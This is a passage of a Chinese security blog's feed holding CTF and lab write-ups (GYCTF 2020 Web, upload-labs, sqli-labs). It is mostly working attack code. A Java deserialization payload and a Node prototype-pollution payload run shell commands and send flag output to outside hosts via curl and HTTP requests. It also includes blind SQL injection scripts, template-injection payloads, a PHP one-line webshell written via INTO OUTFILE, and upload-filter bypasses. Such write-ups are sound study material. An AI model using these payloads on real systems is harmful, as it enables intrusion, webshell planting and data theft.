&#125;</code></pre><p><a href="https://www.laruence.com/2016/07/19/3101.html">https://www.laruence.com/2016/07/19/3101.html</a></p><p>开一台内网主机</p><pre><code># index.php&lt;?php        $arr = array(&quot;success&quot;=&gt;true);        header(&quot;Content-Type:application/json&quot;);        echo json_encode($arr);# 执行 php -S 0:9999</code></pre><pre><code>Proxy: http://174.0.216.98:9999</code></pre><h2 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h2><p>javaweb 的题目</p><p>这里用 Tools 类生成 cookies，而 Tools 类继承序列化类，所以 cookies 有反序列化操作</p><pre><code class="java">// springmvcdemo.war!\WEB-INF\classes\com\filters\ClentInfoFilter.classString b64 = cookie.getValue();      Base64.Decoder decoder = Base64.getDecoder();      byte[] bytes = decoder.decode(b64);      ClientInfo cinfo = null;      if ((b64.equals(&quot;&quot;)) || (bytes == null))      &#123;        cinfo = new ClientInfo(&quot;Anonymous&quot;, &quot;normal&quot;, ((HttpServletRequest)request).getRequestedSessionId());        Base64.Encoder encoder = Base64.getEncoder();        try        &#123;          bytes = Tools.create(cinfo);        &#125;        catch (Exception e)        &#123;          e.printStackTrace();        &#125;        cookie.setValue(encoder.encodeToString(bytes));</code></pre><p>PictureController.class 存在文件上传和文件包含，需要伪造成 admin，webmanager，我们直接在任意一个 jsp 页面运行以下代码覆盖原 cookies 就可以拿去文件上传了。</p><pre><code class="jsp">&lt;%    ClientInfo cinfo = new ClientInfo(&quot;admin&quot;, &quot;webmanager&quot;, ((HttpServletRequest)request).getRequestedSessionId());    byte[] bytes = Tools.create(cinfo);    cookie = new Cookie(&quot;cinfo&quot;, encoder.encodeToString(bytes));    cookie.setMaxAge(86400);    ((HttpServletResponse)response).addCookie(cookie);    ((HttpServletRequest)request).getSession().setAttribute(&quot;cinfo&quot;, cinfo);%&gt;</code></pre><p>但是文件上传只能通过修改文件名存储到 /tmp 目录，jsp 文件包含除了 jpg 和 gif 只能取到文件名，所以此处文件包含是不可取了。赛后看了其他大哥的博客，原来是 <code>ProcessBuilder</code>漏洞。</p><pre><code class="java">  // springmvcdemo.war!\WEB-INF\classes\com\tools\Tools.class  private void readObject(ObjectInputStream in)    throws IOException, ClassNotFoundException  &#123;    Object obj = in.readObject();    new ProcessBuilder((String[])obj).start();  &#125;</code></pre><p>这里我们可以通过重写<code>writeObject</code>方法来实现，来构造一个字符串传给<code>ProcessBuilder</code>执行命令</p><pre><code class="java">private void writeObject(ObjectOutputStream out) throws IOException &#123;        String[] cmd = &#123;&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;curl http://174.0.218.99:9000/`/readflag`&quot;&#125;;        out.writeObject(cmd);&#125;</code></pre><p>在 Tools 类里加上上面的函数，然后生成序列化的 cookies，带上去另一边监听即可得到 flag</p><pre><code class="java">import java.io.*;import java.util.Base64;import com.tools.*;public class exp &#123;    public static void main(String[] args) &#123;        Base64.Encoder encoder = Base64.getEncoder();        try &#123;            Tools cinfo = new Tools();            byte[] bytes = Tools.create(cinfo);            String payload = encoder.encodeToString(bytes);            System.out.println(payload);        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 GYCTF Web</title>
      <link href="/2020/02/29/2020-GYCTF-Web/"/>
      <url>/2020/02/29/2020-GYCTF-Web/</url>
      
        <content type="html"><![CDATA[<blockquote><p>学习到了一点新知识</p></blockquote><span id="more"></span><h2 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h2><p>本题漏洞比较明显，PDO 支持堆叠注入，然后用十六进制绕过 check。</p><pre><code class="python">import requestsimport stringimport binasciiimport urllib.parseimport threadingurl = &quot;http://4efaa4d7badc406b9b50ecab0c36eaeb13b1c0c4b1b14e55.changame.ichunqiu.com/&quot;flag = &quot;&quot;index = 1chset = string.printablesession = requests.Session()# dbname = pdotest# tbname = table1# clname = balabala,eihey,fllllll4g,bbbflag = &#39;&#39;index = 1while True:    l = 0    r = 127    m = (l+r)//2    while l&lt;r:        # print(&quot;[*] try: &#123;&#125;&quot;.format(chr(m)))        payload = &quot;select if(ascii(mid((select fllllll4g from table1),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),1)&quot;.format(index,m)        payload = binascii.b2a_hex(payload.encode()).decode()        payload = &quot;1&quot;+urllib.parse.unquote(&quot;%df&quot;)+&quot;&#39;;set @a=0x&#123;&#125;;prepare cmd from @a;execute cmd;&quot;.format(payload)        paramsGet = &#123;&quot;id&quot;:payload&#125;        try:            res = session.get(url, params=paramsGet, timeout=2)            r = m            m = (l+r)//2        except Exception as e:            l = m + 1            m = (l+r)//2    flag += chr(m)    print(&quot;[+] flag: &#123;&#125;&quot;.format(flag))    index += 1</code></pre><h2 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h2><p>改自 2019 qwb 随便注，过滤了 set、prepare 等，随便搜搜发现是 2019 fudanctf 原题</p><p><a href="https://www.4hou.com/posts/mM60">https://www.4hou.com/posts/mM60</a></p><p>采用的是 mysql handler 的新特性 handler</p><pre><code>https://dev.mysql.com/doc/refman/8.0/en/handler.html</code></pre><p>payload</p><pre><code>1. 获取表名;show tables;#2. 读表&#39;;handler FlagHere open; handler FlagHere read first;</code></pre><h2 id="ezExpress"><a href="#ezExpress" class="headerlink" title="ezExpress"></a>ezExpress</h2><p>考察 toUpperCase() 漏洞和原型链污染，这个原型链污染十分的明显，直接看到未定义变量 outputFunctionName，看到了 merge 函数的触发点</p><p>payload</p><pre><code>1. 注册账号admın:1232. 原型污染 application/json&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;: &quot;test\nvar require = global.require || global.process.mainModule.constructor._load;var result = require(&#39;child_process&#39;).execSync(&#39;ping http://xxxxx/$(cat /flag)&#39;);var req = require(&#39;http&#39;).request(`http://*.*.*.*/?$&#123;result&#125;`);req.end();\n//&quot;&#125;&#125;</code></pre><h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p>这个看了官方 payload 表示无法理解，当时直接随便穿个马就 getshell …大概是过滤没写好吧</p><h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p>反序列化 + piapiapia 原题</p><p>pop 链比较明显，<code>UpdateHelper</code> 的 <code>__destruct()</code> =&gt; <code>User</code> 的 <code>__toString()</code> =&gt;<code>Info</code>的<code>__call()</code>，即可任意执行 sql 语句，然后根据下面的 safe 函数溢出 payload 构成新的序列化语句</p><pre><code class="php">function safe($parm)&#123;    $array= array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&quot;&#39;&quot;,&#39;\\&#39;,&quot;*&quot;,&quot;alter&quot;);    return str_replace($array,&#39;hacker&#39;,$parm);&#125;</code></pre><pre><code class="php">public function getNewInfo()&#123;        $age=$_POST[&#39;age&#39;];        $nickname=$_POST[&#39;nickname&#39;];        return safe(serialize(new Info($age,$nickname)));    &#125;</code></pre><p>参考了月亮大哥的 payload</p><pre><code class="php">&lt;?phpclass User&#123;    public $id;    public $age=&#39;select id,password from user where username=?&#39;;    public $nickname;&#125;class Info&#123;    public $age;    public $nickname = &quot;a&quot;;    public $CtrlCase; &#125;Class UpdateHelper&#123;    public $id;    public $newinfo;    public $sql;&#125;class dbCtrl&#123;    public $hostname=&quot;127.0.0.1&quot;;    public $dbuser=&quot;noob123&quot;;    public $dbpass=&quot;noob123&quot;;    public $database=&quot;noob123&quot;;    public $name=&#39;admin&#39;;    public $password=2;    public $mysqli;    public $token=&quot;admin&quot;;&#125;$o = new dbCtrl();$i = new Info();$i-&gt;CtrlCase = $o;$u = new User();$u-&gt;nickname = $i;$h = new UpdateHelper();$h-&gt;sql = $u;$f = new Info();$f-&gt;CtrlCase = $h;$s = serialize($f);$s = substr($s,47);$len = strlen($s);$res = &quot;&quot;;for($dd=0;$dd&lt;$len;$dd++)&#123;    $res.=&quot;union&quot;;&#125;$res.=$s;echo urlencode($res);// POST:// age=&amp;nickname=上面</code></pre><h2 id="node-game"><a href="#node-game" class="headerlink" title="node_game"></a>node_game</h2><p>这道题当时没完成，结束后才发现当时搭环境没有搭完整…</p><p>也是参考了 Nullcon HackIM 2020 - split second 原题，但是过滤难度下降了，payload 可以直接拿来用</p><p>赛后就在本地复现了上传</p><pre><code class="python">import urllib.parseimport requestspayload = &#39;&#39;&#39; HTTP/1.1POST /file_upload HTTP/1.1Host: xContent-Type: multipart/form-data; boundary=---------------------------20539204871043521200876952878Content-Length: 222Connection: keep-alive-----------------------------20539204871043521200876952878Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;kk.pug&quot;Content-Type: ../templatehack-----------------------------20539204871043521200876952878--GET /flag HTTP/1.1x: &#39;&#39;&#39; payload = payload.replace(&quot;\n&quot;,&quot;\r\n&quot;)payload = &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)proxy = &#123; &quot;http&quot;:&quot;127.0.0.1:8080&quot; &#125;requests.get(&quot;http://127.0.0.1:8081/core&quot;, params=&#123;&#39;q&#39;:payload&#125;)</code></pre><p>把 Nullcon HackIM 2020 - split second的 wp 直接拿过来过一下请求包就可以了</p><p><a href="https://blog.rwx.kr/nullcon-hackim-2020-split-second/">https://blog.rwx.kr/nullcon-hackim-2020-split-second/</a></p><p>最后上传以下代码就可以执行命令了</p><pre><code>-global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;evalcmd&#39;)</code></pre><h2 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h2><p>参考 <a href="https://paper.seebug.org/1114/">https://paper.seebug.org/1114/</a> tp6 的任意写文件漏洞</p><p>写个小马后需要绕过 disable_functions</p><p>利用别人的工具 <a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a> 成功 getshell</p><h2 id="Flaskapp"><a href="#Flaskapp" class="headerlink" title="Flaskapp"></a>Flaskapp</h2><p>题目考察的是 模板注入 + PIN，但是当时按着 PIN 教程复现不了，好像当时是机器 id 取错了，见官方 wp</p><blockquote><p>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同，对于docker机则读取/proc/self/cgroup。</p></blockquote><p>然后当时自己是直接执行命令 getflag 的</p><pre><code class="python">#conding:utf-8import requestsimport reimport base64ec_url = &#39;http://123.57.212.112:10001/&#39;dc_url = ec_url + &#39;decode&#39;proxy = &#123;&quot;http&quot;:&quot;127.0.0.1:8080&quot;&#125;payload = &quot;&#123;% if [].__class__.__base__.__subclasses__()[127].__init__.__globals__['sys'+'tem']('ls / > /tmp/test1') %&#125;2&#123;% endif %&#125;&quot;payload = &quot;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open"payload += "('this_is_the_fl'+'ag.txt', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&quot;r1 = requests.post(url=ec_url,data=&#123;&#39;text&#39;:payload&#125;)# print(r1.text)b64 = re.findall(r&quot;结果  :(.+)&quot;,r1.text)[0].strip()# print(b64)r2 = requests.post(url=dc_url,data=&#123;&#39;text&#39;:b64&#125;)print(r2.text)print(&quot;=============================&quot;)result = re.findall(r&quot;times;&lt;/button&gt;([\d\D]*)&lt;!DOCTYPE html&gt;&quot;,r2.text)[0].strip()print(result)</code></pre><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>被这个 fl4g 坑了好久，一直在考虑暴列明，谁知道可以直接读</p><p>payload</p><pre><code class="python">import requestsimport stringsession = requests.Session()flag = &#39;f&#39;index = 2chset = string.printablewhile True:    for ch in chset:        print(&quot;[*] now ch: &#123;&#125;&quot;.format(ch))        paramsGet = &#123;&quot;id&quot;:&quot;if((ascii(mid(fl4g,&#123;&#125;,1)))in(&#123;&#125;),sleep(3),1)&quot;.format(index,ord(ch))&#125;        r = &#39;&#39;        try:            r = session.get(&quot;http://8539506905a2494b837a7dfc662635f6d7f0286ceecf477f.changame.ichunqiu.com/&quot;, params=paramsGet, timeout=2)        except Exception as e:            flag += ch            index += 1            print(&quot;[+] flag: &#123;&#125;&quot;.format(flag))            if ch==&#39;&#125;&#39;:                exit()            break</code></pre><h2 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h2><p>注册登陆后显示名字，盲猜二次注入，直接贴 payload</p><pre><code>&#39; or updatexml(1,concat(0x7e,(select flaaag from flag)),0) or &#39;</code></pre><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>搜了很久找到了 Sim1e 师傅的笔记，看到了他的无列名注入 <a href="https://www.smi1e.top/sql注入笔记/">https://www.smi1e.top/sql注入笔记/</a></p><p>当时直接使用字符串比较会发生奇妙的错误，需要转成十六进制</p><pre><code class="python">import requestsimport binasciiimport urllib.parseimport stringurl = &#39;http://49c9b1c145ed46acb5073a40c428c5fe070ca683e1374ccc.changame.ichunqiu.com/&#39;flag = &#39;&#39;while True:    l = 0    r = 126    while l &lt;= r:        m = (l+r)//2        p1 = str(binascii.hexlify((flag+chr(m)).encode()))[2:-1]        payload =&#39;(((select 1,0x%s)&lt;=(select * from `f1ag_1s_h3r3_hhhhh`)))&#39;%(p1)        # print(payload)        paramsPost = &#123;&quot;id&quot;:payload&#125;        res = requests.post(url, data=paramsPost)        # print(res.text)        if &#39;Nu1L&#39; in res.text:            l = m + 1        else:            r = m - 1    m = (l+r+1)//2    flag += chr(m-1)    print(&quot;[+] flag: %s&quot; % flag)print(flag)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="/2020/02/28/upload-labs/"/>
      <url>/2020/02/28/upload-labs/</url>
      
        <content type="html"><![CDATA[<blockquote><p>之前的一些关于 upload-labs 的练习</p></blockquote><span id="more"></span><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>修改后缀名</p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>Content-type 改为 image/gif</p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><ol><li><p>改后缀名  <code>php2, php3, php4, php5, phps, pht, phtm, phtml</code></p></li><li><p>重写文件解析规则绕过。上传先上传一个名为<code>.htaccess</code>文件，内容如下：</p></li></ol><pre><code>&lt;FilesMatch &quot;03.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>然后再上传一个<code>03.jpg</code></p><p>执行上传的<code>03.jpg</code>脚本</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>查看源代码 发现黑名单几乎过滤了全部的违法后缀名 ，<strong>但少过滤了 .htaccess 后缀</strong></p><ol><li>上传一个.htaccess 文件 重写 服务器的文件解析  </li></ol><p>创建一个 .htaccess 文件</p><p>内容可以是 : AddType application/x-httpd-php .jpg,可将jpg文件解析为php文件.</p><p>或者是 : SetHandler application/x-httpd-php,可将其他所有文件解析为php文件.</p><ol start="2"><li>利用PHP 和 Windows环境的叠加特性，以下符号在正则匹配时的相等性：</li></ol><pre><code>双引号&quot;     =   点号.大于符号&gt;   =   问号?小于符号&lt;   =   星号*</code></pre><p>先把4.php文件后缀改为4.jpg  然后用bs 将文件名改为 4.php:.jpg，上传成功后会生成4.php的空文件，大小为0KB.</p><p>然后再在bs 中把文件名 改为4.&lt;或4.&lt;&lt;&lt;或4.&gt;&gt;&gt;或4.&gt;&gt;&lt;后再次上传，重写4.php文件内容，Webshell代码就会写入原来的4.php空文件中。</p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>查看源代码发现 黑名单里加上了 .htaccess 后缀 ，但是没有 进行大小写过滤</p><p>与 Pass-04 一样</p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>在 pass-05 的基础上加上了大小写过滤， 但发现去掉了收尾去空</p><p>查了一下：<code>trim()</code>函数 : <code>移除字符串两侧的空白字符或其他预定义字符</code>.</p><p>Win下<code>xx.jpg[空格] 或xx.jpg.</code>这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点**</p><p>用 bs 在1.php 后缀名后面加一个空格成功绕过</p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>没有删除文件后缀名的点</p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>查看源代码后发现 黑名单过滤 没有去字符串 ::$DATA </p><p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：<code>$ DATA</code>。<br>上传<code>.php::$DATA</code>绕过。(仅限windows)  上传后 自动保存为 1.php</p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><strong>原理同Pass-06</strong>，上传文件名后加上<strong>点+空格+点</strong>，改为<code>09.php. .</code></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>双写文件名绕过，文件名改成<code>10.pphphp</code></p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>上传路径名%00截断绕过。上传的文件名写成<code>11.jpg</code>, save_path改成<code>../upload/11.php%00</code>，最后保存下来的文件就是<code>11.php</code></p><p>但这东西有点过气了，因为需要两个条件</p><ol><li>php版本小于5.3.4</li><li>php的<strong>magic_quotes_gpc</strong>为OFF状态</li></ol><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>php.ini设置 <code>magic_quotes_gpc = Off</code></p><p>POST 不能解析 url 编码，所以可以用 0x00</p><p>原理同<strong>Pass-11</strong>，上传路径0x00绕过。利用Burpsuite的Hex功能将save_path改成<code>../upload/12.php【二进制00】</code>形式</p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>代码通过读取上传文件的<strong>前两字节判断是否为图片</strong></p><pre><code> $bin = fread($file, 2); //只读2字节    fclose($file);    $strInfo = @unpack(&quot;C2chars&quot;, $bin); </code></pre><p>绕过文件头检查，添加GIF图片的文件头<code>GIF89a</code>，绕过GIF图片检查。</p><p>使用命令<code>copy normal.jpg /b + shell.php /a webshell.jpg</code>，将php一句话追加到jpg图片末尾，代码不全的话，人工补充完整。形成一个包含Webshell代码的新jpg图片，然后直接上传即可。<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.jpg">JPG一句话shell参考示例</a></p><p>png图片处理方式同上。<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.png">PNG一句话shell参考示例</a></p><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p><code>getimagesize</code>通过检查图像文件的大小并返回图像的尺寸以及文件类型</p><pre><code>list($width, $height, $type, $attr) = getimagesize(&quot;runoob-logo.png&quot;);</code></pre><p><code>image_type_to_extension</code>根据指定的图像类型返回对应的后缀名</p><p>原理和示例同<strong>Pass-13</strong>，添加GIF图片的文件头绕过检查</p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><pre><code>$image_type = exif_imagetype($filename);</code></pre><p><img src="C:%5CUsers%5CIrving%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564977362026.png" alt="1564977362026"></p><p>原理同<strong>Pass-13</strong>，添加GIF图片的文件头绕过检查</p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。</p><p>这里提供一个包含一句话webshell代码并可以绕过PHP的imagecreatefromgif函数的GIF图片<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromgif-pass-00.gif">示例</a>。</p><p>打开被渲染后的图片，Webshell代码仍然存在。</p><p>提供一个jpg格式图片绕过imagecreatefromjpeg函数渲染的一个<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromjpeg-pass-LandGrey.jpg">示例文件</a>。 直接上传示例文件会触发Warning警告，并提示文件不是jpg格式的图片。但是实际上已经上传成功，而且示例文件名没有改变。</p><p>从上面上传jpg图片可以看到我们想复杂了，程序没有对渲染异常进行处理，直接在正常png图片内插入webshell代码，然后上传<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefrompng-pass-LandGrey.png">示例文件</a>即可，并不需要图片是正常的图片。</p><p>程序依然没有对文件重命名，携带webshell的无效损坏png图片直接被上传成功。</p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>条件竞争</p><pre><code class="python">#!/usr/bin/env python# coding:utf-8# Build By LandGreyimport hackhttpfrom multiprocessing.dummy import Pool as ThreadPooldef upload(lists):    hh = hackhttp.hackhttp()    raw = &quot;&quot;&quot;POST /upload-labs/Pass-17/index.php HTTP/1.1Host: localhost:8089User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://localhost:8089/upload-labs/Pass-17/index.phpContent-Type: multipart/form-data; boundary=---------------------------287032381131322Content-Length: 334Connection: keep-aliveUpgrade-Insecure-Requests: 1-----------------------------287032381131322Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.php&quot;Content-Type: application/octet-stream&lt;?php phpinfo(); ?&gt;-----------------------------287032381131322Content-Disposition: form-data; name=&quot;submit&quot;ä¸ä¼ -----------------------------287032381131322--&quot;&quot;&quot;    code, head, html, redirect, log = hh.http(&#39;http://localhost:8089/upload-labs/Pass-17/index.php&#39;, raw=raw)    print(str(code) + &quot;\r&quot;)pool = ThreadPool(10)pool.map(upload, range(10000))pool.close()pool.join()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> PRACTICE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs</title>
      <link href="/2020/02/28/sqli-labs/"/>
      <url>/2020/02/28/sqli-labs/</url>
      
        <content type="html"><![CDATA[<blockquote><p>之前的一些关于 sqli-labs 的练习</p></blockquote><span id="more"></span><h2 id="Less-1（单引号-union-注入）"><a href="#Less-1（单引号-union-注入）" class="headerlink" title="Less-1（单引号 union 注入）"></a>Less-1（单引号 union 注入）</h2><pre><code>?id=&#39; union select 1,2,group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = database()--+?id=&#39; union select 1,2,group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = database() and TABLE_NAME = &#39;users&#39;--+?id=&#39; union select 1,2,group_concat(password) from users--+</code></pre><h2 id="Less-2（无引号-union-注入）"><a href="#Less-2（无引号-union-注入）" class="headerlink" title="Less-2（无引号 union 注入）"></a>Less-2（无引号 union 注入）</h2><pre><code>?id=0 union select 1,2,group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = database()--+?id=0 union select 1,2,group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = database() and TABLE_NAME = &#39;users&#39;--+?id=0 union select 1,2,group_concat(password) from users--+</code></pre><h2 id="Less-3（单引号括号-union-注入）"><a href="#Less-3（单引号括号-union-注入）" class="headerlink" title="Less-3（单引号括号 union 注入）"></a>Less-3（单引号括号 union 注入）</h2><pre><code>?id=&#39;) union select 1,2,group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = database()--+?id=&#39;) union select 1,2,group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = database() and TABLE_NAME = &#39;users&#39;--+?id=&#39;) union select 1,2,group_concat(password) from users--+</code></pre><h2 id="Less-4（双引号-union-注入）"><a href="#Less-4（双引号-union-注入）" class="headerlink" title="Less-4（双引号 union 注入）"></a>Less-4（双引号 union 注入）</h2><pre><code>?id=&quot;) union select 1,2,group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = database()--+?id=&quot;) union select 1,2,group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = database() and TABLE_NAME = &#39;users&#39;--+?id=&quot;) union select 1,2,group_concat(password) from users--+</code></pre><h2 id="Less-5（单引号双注入）"><a href="#Less-5（单引号双注入）" class="headerlink" title="Less-5（单引号双注入）"></a>Less-5（单引号双注入）</h2><pre><code>?id=1&#39; union select 1,count(*),concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=database() limit 3,1), &#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+?id=1&#39; union select 1,count(*),concat(&#39;~&#39;,(select column_name from  information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 2,1), &#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+?id=1&#39; union select 1,count(*),concat(&#39;~&#39;,(select password from  users limit 0,1), &#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</code></pre><h2 id="Less-6（双引号双注入）"><a href="#Less-6（双引号双注入）" class="headerlink" title="Less-6（双引号双注入）"></a>Less-6（双引号双注入）</h2><pre><code>?id=1&quot; union select 1,count(*),concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=database() limit 3,1), &#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+?id=1&quot; union select 1,count(*),concat(&#39;~&#39;,(select column_name from  information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 2,1), &#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+?id=1&quot; union select 1,count(*),concat(&#39;~&#39;,(select password from  users limit 0,1), &#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</code></pre><h2 id="Less-7（一句话木🐎）"><a href="#Less-7（一句话木🐎）" class="headerlink" title="Less-7（一句话木🐎）"></a>Less-7（一句话木🐎）</h2><pre><code>@@datadir 读取数据库路径@@basedir MYSQL 获取安装路径?id=1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;123&quot;]); ?&gt;&#39; into outfile &#39;E:\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\test.php&#39;--+上菜刀</code></pre><h2 id="Less-8（单引号布尔盲注）"><a href="#Less-8（单引号布尔盲注）" class="headerlink" title="Less-8（单引号布尔盲注）"></a>Less-8（单引号布尔盲注）</h2><pre><code class="python">import requestsimport stringurl = &quot;http://localhost:8088/sqli-labs-master/Less-8/&quot;length = 0&#39;&#39;&#39;盲注结果：|- security    |- emails    |- referers    |- uagents    |- users        |- id        |- username        |- password            |- Dumb            |- ...&#39;&#39;&#39;def getLength():    global length    for i in range(2,11):        #payload = &quot;&#39; or length(database())=&quot; + str(i) + &quot;#&quot;        #payload = &quot;&#39; or length((select table_name from information_schema.tables where table_schema=database() limit 4,1))=&quot; + str(i) + &quot;#&quot;        #payload = &quot;&#39; or length((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 2,1))=&quot; + str(i) + &quot;#&quot;        payload = &quot;&#39; or length((select password from users limit 0,1))=&quot; + str(i) + &quot;#&quot;        data = &#123;            &#39;id&#39;:payload        &#125;        r = requests.get(url,params=data)        if &quot;You are in&quot; in r.text:            length = i            print(&quot;【+】 right length: &quot; + str(i))            break        else:            pass            print(&quot;【*】 wrong length: &quot; + str(i))def getPayload():    password = &quot;&quot;    for i in range(1,length+1):        left = ord(&#39;a&#39;)        right = ord(&#39;z&#39;)        while left != right:            mid = int((left + right) / 2)            #payload = &quot;&#39; or ASCII(mid(database(),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;            #payload = &quot;&#39; or ASCII(mid((select table_name from information_schema.tables where table_schema=database() limit 4,1),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;            #payload = &quot;&#39; or ASCII(mid((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 2,1),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;            payload = &quot;&#39; or ASCII(mid((select password from users limit 0,1),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;            data = &#123;                &#39;id&#39;:payload            &#125;            r = requests.get(url,params=data)            if &quot;You are in&quot; in r.text:                left = mid + 1                print(str(i) + &quot; &gt; &quot; + chr(mid))            else:                right = mid                print(str(i) + &quot; &lt;= &quot; + chr(mid))        password += chr(left)        print(&quot;【+】 password: &quot; + 